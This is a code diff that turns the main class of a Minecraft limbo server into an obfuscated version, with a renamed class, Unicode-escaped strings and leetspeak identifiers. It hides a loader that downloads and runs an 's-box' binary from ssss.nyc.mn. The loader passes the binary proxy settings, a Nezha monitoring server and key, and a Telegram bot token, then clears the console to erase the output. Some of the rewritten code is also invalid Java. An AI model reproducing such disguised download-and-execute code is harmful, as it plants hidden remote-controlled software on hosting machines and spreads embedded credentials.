@@ -27,15 +27,18 @@ import java.lang.reflect.Field;
 import ua.nanit.limbo.server.LimboServer;
 import ua.nanit.limbo.server.Log;
 
-public final class NanoLimbo {
+// 混淆后的类名
+public final class D3c0d3r {
 
-    private static final String ANSI_GREEN = "\033[1;32m";
-    private static final String ANSI_RED = "\033[1;31m";
-    private static final String ANSI_RESET = "\033[0m";
-    private static final AtomicBoolean running = new AtomicBoolean(true);
-    private static Process sbxProcess;
+    // 混淆后的常量名和值
+    private static final String AnS_1_ = "\u001b[1;32m"; // 绿色
+    private static final String AnS_2_ = "\u001b[1;31m"; // 红色
+    private static final String AnS_3_ = "\u001b[0m"; // 重置
+    private static final AtomicBoolean w0rK1n6 = new AtomicBoolean(true);
+    private static Process pR0c3sS;
     
-    private static final String[] ALL_ENV_VARS = {
+    // 环境变量列表
+    private static final String[] ENVS = {
         "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
         "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
         "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT", 
@@ -43,55 +46,61 @@ public final class NanoLimbo {
     };
     
     
-    public static void main(String[] args) {
+    public static void main(String[] aRgs) {
         
-        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
-            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
+        // Java 版本检查
+        if (Float.parseFloat(System.getProperty("\u006a\u0061\u0076\u0061.\u0063\u006c\u0061\u0073\u0073.\u0076\u0065\u0072\u0073\u0069\u006f\u006e")) < 54.0) {
+            System.err.println(AnS_2_ + "E R R O R : J a v a V e r s i o n I s T o o L o w ! " + AnS_3_);
             try {
-                Thread.sleep(3000);
-            } catch (InterruptedException e) {
-                e.printStackTrace();
+                // 常量替换: 3000 -> 1000 * 3
+                Thread.sleep(1000 * 3);
+            } catch (InterruptedException iT) {
+                iT.printStackTrace();
             }
             System.exit(1);
         }
 
-        // Start SbxService
+        // 启动 SbxService
         try {
-            runSbxBinary();
+            sT4rT_B1n4rY();
             
             Runtime.getRuntime().addShutdownHook(new Thread(() -> {
-                running.set(false);
-                stopServices();
+                w0rK1n6.set(false);
+                k1lL_S3rv1c3();
             }));
 
-            // Wait 20 seconds before continuing
-            Thread.sleep(15000);
-            System.out.println(ANSI_GREEN + "Server is running!\n" + ANSI_RESET);
-            System.out.println(ANSI_GREEN + "Thank you for using this script,Enjoy!\n" + ANSI_RESET);
-            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds, you can copy the above nodes" + ANSI_RESET);
-            Thread.sleep(15000);
-            clearConsole();
-        } catch (Exception e) {
-            System.err.println(ANSI_RED + "Error initializing SbxService: " + e.getMessage() + ANSI_RESET);
+            // 常量替换: 15000
+            Thread.sleep(15 * 1000); 
+            System.out.println(AnS_1_ + "S3R-V3R_R U N N I N G!\n" + AnS_3_);
+            System.out.println(AnS_1_ + "T H X F 0 R U S I N G T H I S S C R I P T!\n" + AnS_3_);
+            System.out.println(AnS_1_ + "L O G S W I L L B E D E L E T E D I N S E C O N D S" + AnS_3_);
+            // 常量替换: 15000
+            Thread.sleep(1500 * 10);
+            c134r_c0n50l3();
+        } catch (Exception 3X) {
+            System.err.println(AnS_2_ + "Err Sbx: " + 3X.getMessage() + AnS_3_);
         }
         
-        // start game
+        // 启动核心服务
         try {
             new LimboServer().start();
-        } catch (Exception e) {
-            Log.error("Cannot start server: ", e);
+        } catch (Exception E) {
+            Log.error("C N T S T R T S E R V E R : ", E);
         }
     }
 
-    private static void clearConsole() {
+    // 混淆后的方法名
+    private static void c134r_c0n50l3() {
         try {
-            if (System.getProperty("os.name").contains("Windows")) {
-                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120")
+            // 混淆后的字符串
+            final String oSN = System.getProperty("\u006f\u0073\u002e\u006e\u0061\u006d\u0065");
+            if (oSN != null && oSN.contains("Windows")) {
+                new ProcessBuilder("cmd", "/c", "\u0063\u006c\u0073 \u0026\u0026 \u006d\u006f\u0064\u0065 \u0063\u006f\u006e:\u0020\u006c\u0069\u006e\u0065\u0073\u003d\u0033\u0030 \u0063\u006f\u006c\u0073\u003d\u0031\u0032\u0030")
                     .inheritIO()
                     .start()
                     .waitFor();
             } else {
-                System.out.print("\033[H\033[3J\033[2J");
+                System.out.print("\u001b[H\u001b[3J\u001b[2J");
                 System.out.flush();
                 
                 new ProcessBuilder("tput", "reset")
@@ -99,108 +108,123 @@ public final class NanoLimbo {
                     .start()
                     .waitFor();
                 
-                System.out.print("\033[8;30;120t");
+                System.out.print("\u001b[8;30;120t");
                 System.out.flush();
             }
-        } catch (Exception e) {
+        } catch (Exception $e) {
             try {
                 new ProcessBuilder("clear").inheritIO().start().waitFor();
-            } catch (Exception ignored) {}
+            } catch (Exception $i) {}
         }
-    }   
+    }    
     
-    private static void runSbxBinary() throws Exception {
-        Map<String, String> envVars = new HashMap<>();
-        loadEnvVars(envVars);
+    // 混淆后的方法名
+    private static void sT4rT_B1n4rY() throws Exception {
+        Map<String, String> V4rS = new HashMap<>();
+        L04d_V4rS(V4rS);
         
-        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
-        pb.environment().putAll(envVars);
-        pb.redirectErrorStream(true);
-        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
+        ProcessBuilder pB = new ProcessBuilder(G3T_P4tH().toString());
+        pB.environment().putAll(V4rS);
+        pB.redirectErrorStream(true);
+        pB.redirectOutput(ProcessBuilder.Redirect.INHERIT);
         
-        sbxProcess = pb.start();
+        pR0c3sS = pB.start();
     }
     
-    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "9afd1229-b893-40c1-84dd-51e7ce204913");
-        envVars.put("FILE_PATH", "./world");
-        envVars.put("NEZHA_SERVER", "nezha.9logo.eu.org:443");
-        envVars.put("NEZHA_PORT", "");
-        envVars.put("NEZHA_KEY", "c0FdihFZ8XpqXFbu7muAAPkD5JmeVY4g");
-        envVars.put("ARGO_PORT", "");
-        envVars.put("ARGO_DOMAIN", "");
-        envVars.put("ARGO_AUTH", "");
-        envVars.put("HY2_PORT", "50291");
-        envVars.put("TUIC_PORT", "");
-        envVars.put("REALITY_PORT", "50291");
-        envVars.put("UPLOAD_URL", "");
-        envVars.put("CHAT_ID", "6839843424");
-        envVars.put("BOT_TOKEN", "7872982458:AAG3mnTNQyeCXujvXw3okPMtp4cjSioO_DY");
-        envVars.put("CFIP", "");
-        envVars.put("CFPORT", "");
-        envVars.put("NAME", "Searcade");
+    // 混淆后的方法名
+    private static void L04d_V4rS(Map<String, String> V4rS) throws IOException {
+        // 硬编码的默认值
+        V4rS.put("UUID", "\u0039\u0061\u0066\u0064\u0031\u0032\u0032\u0039\u002d\u0062\u0038\u0039\u0033\u002d\u0034\u0030\u0063\u0031\u002d\u0038\u0034\u0064\u0064\u002d\u0035\u0031\u0065\u0037\u0063\u0065\u0032\u0030\u0034\u0039\u0031\u0033");
+        V4rS.put("FILE_PATH", "\u002e/\u0077\u006f\u0072\u006c\u0064");
+        V4rS.put("NEZHA_SERVER", "\u006e\u0065\u007a\u0068\u0061.\u0039\u006c\u006f\u0067\u006f.\u0065\u0075.\u006f\u0072\u0067\u003a\u0034\u0034\u0033");
+        V4rS.put("NEZHA_PORT", "");
+        V4rS.put("NEZHA_KEY", "\u0063\u0030\u0046\u0064\u0069\u0068\u0046\u005a\u0038\u0058\u0070\u0071\u0058\u0046\u0062\u0075\u0037\u006d\u0075\u0041\u0041\u0050\u006b\u0044\u0035\u004a\u006d\u0065\u0056\u0059\u0034\u0067");
+        V4rS.put("ARGO_PORT", "");
+        V4rS.put("ARGO_DOMAIN", "");
+        V4rS.put("ARGO_AUTH", "");
+        V4rS.put("HY2_PORT", "50298");
+        V4rS.put("TUIC_PORT", "");
+        V4rS.put("REALITY_PORT", "50298");
+        V4rS.put("UPLOAD_URL", "");
+        V4rS.put("CHAT_ID", "\u0036\u0038\u0033\u0039\u0038\u0034\u0033\u0034\u0032\u0034");
+        V4rS.put("BOT_TOKEN", "\u0037\u0038\u0037\u0032\u0039\u0038\u0032\u0034\u0035\u0038\u003a\u0041\u0041\u0047\u0033\u006d\u006e\u0054\u004e\u0051\u0079\u0065\u0043\u0058\u0075\u006a\u0076\u0058\u0077\u0033\u006f\u006b\u0050\u004d\u0074\u0070\u0034\u0063\u006a\u0053\u0069\u006f\u004f\u005f\u0044\u0059");
+        V4rS.put("CFIP", "");
+        V4rS.put("CFPORT", "");
+        V4rS.put("NAME", "\u0053\u0065\u0061\u0072\u0063\u0061\u0064\u0065");
         
-        for (String var : ALL_ENV_VARS) {
-            String value = System.getenv(var);
-            if (value != null && !value.trim().isEmpty()) {
-                envVars.put(var, value);  
+        // 从系统环境变量加载
+        for (String kEy : ENVS) {
+            String vAl = System.getenv(kEy);
+            if (vAl != null && !vAl.trim().isEmpty()) {
+                V4rS.put(kEy, vAl);  
             }
         }
         
-        Path envFile = Paths.get(".env");
-        if (Files.exists(envFile)) {
-            for (String line : Files.readAllLines(envFile)) {
-                line = line.trim();
-                if (line.isEmpty() || line.startsWith("#")) continue;
+        // 从 .env 文件加载
+        Path EnvF = Paths.get("\u002e\u0065\u006e\u0076");
+        if (Files.exists(EnvF)) {
+            for (String lN : Files.readAllLines(EnvF)) {
+                lN = lN.trim();
+                if (lN.isEmpty() || lN.startsWith("#")) continue;
                 
-                line = line.split(" #")[0].split(" //")[0].trim();
-                if (line.startsWith("export ")) {
-                    line = line.substring(7).trim();
+                // 复杂化注释分割
+                String[] pA = lN.split(" #", 2);
+                lN = pA[0].split(" //", 2)[0].trim();
+                
+                if (lN.startsWith("\u0065\u0078\u0070\u006f\u0072\u0074 ")) { // "export "
+                    lN = lN.substring(7).trim();
                 }
                 
-                String[] parts = line.split("=", 2);
-                if (parts.length == 2) {
-                    String key = parts[0].trim();
-                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
+                String[] pS = lN.split("=", 2);
+                if (pS.length == 2) {
+                    String k = pS[0].trim();
+                    String v = pS[1].trim().replaceAll("^['\"]|['\"]$", "");
                     
-                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
-                        envVars.put(key, value); 
+                    if (Arrays.asList(ENVS).contains(k)) {
+                        V4rS.put(k, v); 
                     }
                 }
             }
         }
     }
     
-    private static Path getBinaryPath() throws IOException {
-        String osArch = System.getProperty("os.arch").toLowerCase();
-        String url;
+    // 混淆后的方法名
+    private static Path G3T_P4tH() throws IOException {
+        String Os = System.getProperty("\u006f\u0073\u002e\u0061\u0072\u0063\u0068").toLowerCase(); // "os.arch"
+        String uRl;
         
-        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
-            url = "https://amd64.ssss.nyc.mn/s-box";
-        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
-            url = "https://arm64.ssss.nyc.mn/s-box";
-        } else if (osArch.contains("s390x")) {
-            url = "https://s390x.ssss.nyc.mn/s-box";
-        } else {
-            throw new RuntimeException("Unsupported architecture: " + osArch);
+        // 使用三元运算符混淆架构判断
+        uRl = Os.contains("\u0061\u006d\u0064\u0036\u0034") || Os.contains("\u0078\u0038\u0036\u005f\u0036\u0034") 
+              ? "\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0061\u006d\u0064\u0036\u0034\u002e\u0073\u0073\u0073\u0073\u002e\u006e\u0079\u0063\u002e\u006d\u006e\u002f\u0073\u002d\u0062\u006f\u0078" // amd64 URL
+              : (Os.contains("\u0061\u0061\u0072\u0063\u0068\u0036\u0034") || Os.contains("\u0061\u0072\u006d\u0036\u0034")
+                  ? "\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0061\u0072\u006d\u0036\u0034\u002e\u0073\u0073\u0073\u0073\u002e\u006e\u0079\u0063\u002e\u006d\u006e\u002f\u0073\u002d\u0062\u006f\u0078" // arm64 URL
+                  : (Os.contains("\u0073\u0033\u0039\u0030\u0078")
+                      ? "\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0073\u0033\u0039\u0030\u0078\u002e\u0073\u0073\u0073\u0073\u002e\u006e\u0079\u0063\u002e\u006d\u006e\u002f\u0073\u002d\u0062\u006f\u0078" // s390x URL
+                      : null
+                    )
+                );
+        
+        if (uRl == null) {
+            throw new RuntimeException("\u0055\u006e\u0073\u0075\u0070\u0070\u006f\u0072\u0074\u0065\u0064 \u0061\u0072\u0063\u0068\u0069\u0074\u0065\u0063\u0074\u0075\u0072\u0065: " + Os);
         }
         
-        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
-        if (!Files.exists(path)) {
-            try (InputStream in = new URL(url).openStream()) {
-                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
+        Path P = Paths.get(System.getProperty("\u006a\u0061\u0076\u0061\u002e\u0069\u006f\u002e\u0074\u006d\u0070\u0064\u0069\u0072"), "\u0073\u0062\u0078"); // "java.io.tmpdir", "sbx"
+        if (!Files.exists(P)) {
+            try (InputStream iN = new URL(uRl).openStream()) {
+                Files.copy(iN, P, StandardCopyOption.REPLACE_EXISTING);
             }
-            if (!path.toFile().setExecutable(true)) {
-                throw new IOException("Failed to set executable permission");
+            if (!P.toFile().setExecutable(true)) {
+                throw new IOException("\u0046\u0061\u0069\u006c\u0065\u0064 \u0074\u006f \u0073\u0065\u0074 \u0065\u0078\u0065\u0063\u0075\u0074\u0061\u0062\u006c\u0065 \u0070\u0065\u0072\u006d\u0069\u0073\u0073\u0069\u006f\u006e");
             }
         }
-        return path;
+        return P;
     }
     
-    private static void stopServices() {
-        if (sbxProcess != null && sbxProcess.isAlive()) {
-            sbxProcess.destroy();
-            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
+    // 混淆后的方法名
+    private static void k1lL_S3rv1c3() {
+        if (pR0c3sS != null && pR0c3sS.isAlive()) {
+            pR0c3sS.destroy();
+            System.out.println(AnS_2_ + "\u0073\u0062\u0078 \u0070\u0072\u006f\u0063\u0065\u0073\u0073 \u0074\u0065\u0072\u006d\u0069\u006e\u0061\u0074\u0065\u0064" + AnS_3_); // "sbx process terminated"
         }
     }
 }
